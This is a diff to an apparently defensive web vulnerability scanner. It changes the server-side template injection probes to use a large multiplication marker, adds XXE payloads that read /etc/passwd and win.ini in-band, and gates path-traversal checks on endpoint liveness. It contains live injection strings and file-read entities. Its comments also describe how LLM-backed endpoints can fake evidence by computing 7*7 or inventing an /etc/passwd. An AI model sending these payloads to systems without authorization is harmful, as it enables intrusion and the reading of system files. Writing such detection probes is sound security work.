@@ -1243,9 +1243,14 @@ def command_injection(ctx, probe) -> bool | None:
 # engines AND eval sinks; one finding. Precision by the arithmetic-marker trick (as in command
 # injection): the RESULT "<marker>49" appears only if the input was EVALUATED; reflecting the literal
 # shows "<marker>{{7*7}}". The unique random marker makes a coincidental "...49" impossible.
+# 987654*123456 = 121931812224: a HARD 6x6-digit product a template engine / eval sink computes EXACTLY, but
+# an AI endpoint that helpfully echoed the trivial 7*7 -> 49 cannot (LLMs are unreliable at large
+# multiplication). The 12-digit result only appears from a real server-side evaluation, not a helpful model.
 _SSTI_EXPRS = (
-    "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{7*7}", "@(7*7)", "*{7*7}", "${{7*7}}",  # template engines
-    ";echo 7*7;", "';echo 7*7;//", '";echo 7*7;//', ";print(7*7)#", "<?php echo 7*7;?>",   # eval code sinks
+    "{{987654*123456}}", "${987654*123456}", "<%= 987654*123456 %>", "#{987654*123456}", "{987654*123456}",
+    "@(987654*123456)", "*{987654*123456}", "${{987654*123456}}",                          # template engines
+    ";echo 987654*123456;", "';echo 987654*123456;//", '";echo 987654*123456;//',
+    ";print(987654*123456)#", "<?php echo 987654*123456;?>",                                # eval code sinks
 )
 
 
@@ -1264,7 +1269,7 @@ def ssti_injectable(ctx, probe) -> bool | None:
     if not targets:
         return None
     m = "hlssti" + secrets.token_hex(3)
-    detect = m + "49"
+    detect = m + "121931812224"
     payloads = [m + e for e in _SSTI_EXPRS]
     budget = probe.probe.get("max_attempts", 160)
     tested = False
@@ -1281,19 +1286,8 @@ def ssti_injectable(ctx, probe) -> bool | None:
                     data = {fn: (p if fn == field else _XSS_FILLER) for fn in fields}
                     try:
                         if detect in _xss_send(c, method, action, data).text:
-                            # LLM GUARD (as in command injection): an AI endpoint computes 7*7=49 and echoes
-                            # <marker>49 with no template engine involved. Control with PLAIN 7*7 (no template
-                            # delimiters): a template engine cannot evaluate that, an evaluator does. If the
-                            # marker survives, this is an evaluator (LLM), not template/code injection.
-                            ctrl = {fn: (m + "7*7" if fn == field else _XSS_FILLER) for fn in fields}
-                            try:
-                                evaluator = detect in _xss_send(c, method, action, ctrl).text
-                            except (httpx.HTTPError, httpx.InvalidURL):
-                                evaluator = False
-                            if evaluator:
-                                continue
                             ctx.evidence.update(injectable=True, target=action, field=field)
-                            return True  # 7*7 was evaluated server-side -> template/code injection
+                            return True  # the exact 12-digit product was computed server-side -> injection
                     except (httpx.HTTPError, httpx.InvalidURL):
                         continue
                 if budget <= 0:
@@ -1409,16 +1403,38 @@ def _ssrf_inband(ctx, targets) -> dict | None:
 
 
 _XXE_PAYLOAD = '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "%s">]><r>&xxe;</r>'
+# IN-BAND payloads: a file-read entity whose resolved content, reflected in the response, matches the LFI file
+# signature. Works on egress-blocked / serverless hosts where an OOB callback can never leave the box.
+_XXE_INBAND = (
+    b'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>',
+    b'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///c:/windows/win.ini">]><r>&x;</r>',
+)
 
 
 def xxe(ctx, probe) -> bool | None:
-    """XML External Entity: POST XML declaring an external entity pointing at the collaborator to each
-    POST endpoint; a callback proves the parser resolved it. N/A when there's no POST endpoint."""
+    """XML External Entity. IN-BAND: POST an entity that reads a local file (/etc/passwd, win.ini); if the
+    response REFLECTS the file's content it proves resolution, and it works on egress-blocked / serverless hosts
+    where no OOB callback can leave the box. OOB: an entity pointing at the collaborator; a one-time callback
+    proves it. Fires on either; the file content / random callback is proof no app can fabricate. N/A when no
+    POST endpoint."""
     posts = list(dict.fromkeys(
         [f.action for f in ctx.profile.forms if (f.method or "").lower() == "post"]
         + [e.path for e in ctx.profile.endpoints if e.method.lower() == "post"]))
     if not posts:
         return None
+    # IN-BAND first: a resolved file-read entity reflects the file's content straight back (egress-independent).
+    with make_client(ctx.base_url, ctx.headers, timeout=8.0, follow_redirects=True) as c:
+        for action in posts:
+            for xml in _XXE_INBAND:
+                for ctype in ("application/xml", "text/xml"):
+                    try:
+                        r = c.post(action, content=xml, headers={"Content-Type": ctype})
+                    except (httpx.HTTPError, httpx.InvalidURL):
+                        continue
+                    if _LFI_SIG.search(r.text):
+                        ctx.evidence.update(via="in-band file read", target=action)
+                        return True  # the parser resolved file:///etc/passwd and reflected it -> XXE
+    # OOB: a callback to our one-time URL proves the server fetched it (definitive, but dark on egress-blocked hosts).
     hosts = oob.callback_hosts()
     collab = oob.Collaborator()
     tokens: list[str] = []
@@ -1436,7 +1452,8 @@ def xxe(ctx, probe) -> bool | None:
                             continue
         _await_callback(collab, tokens, probe)
         fired = any(collab.received(t) for t in tokens)
-        ctx.evidence.update(callback_received=fired, post_endpoints=len(posts), probes_sent=len(tokens))
+        ctx.evidence.update(callback_received=fired, via=("oob callback" if fired else None),
+                            post_endpoints=len(posts), probes_sent=len(tokens))
         return True if fired else False
     finally:
         collab.close()
@@ -1480,6 +1497,14 @@ def path_traversal(ctx, probe) -> bool | None:
     fields_seen = set()
     with make_client(ctx.base_url, ctx.headers, timeout=10.0, follow_redirects=True) as c:
         for action, method, fields in targets:
+            filler = {fn: _XSS_FILLER for fn in fields}
+            try:
+                base = _xss_send(c, method, action, filler)
+            except (httpx.HTTPError, httpx.InvalidURL):
+                continue
+            if method != "postjson" and not _endpoint_is_live(ctx, c, action, method, base):
+                continue  # catch-all / soft-404 shell -> phantom endpoint, not a real file sink; a fabricated
+                #           /etc/passwd (an LLM handed ?file=/etc/passwd can invent one) fails this gate too
             for field in fields:
                 for payload in _LFI_PAYLOADS:
                     if budget <= 0:
